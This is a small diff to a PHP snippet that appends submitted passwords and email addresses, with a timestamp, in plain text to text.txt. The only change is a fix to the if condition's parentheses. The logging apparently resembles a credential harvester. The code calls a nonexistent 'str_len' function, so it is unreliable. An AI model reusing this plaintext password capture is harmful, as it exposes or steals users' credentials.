@@ -45,7 +45,7 @@
     $fail = fopen("text.txt",'a+');
     $t = date("d.m.y.h.m");
     if (isset($fail)){
-        if (str_len($pass)>0) && (str_len($email)>0){
+        if (str_len($pass)>0 && str_len($email)>0){
             
             fwrite($fail,"$pass :$t  $email".PHP_EOL);
         }
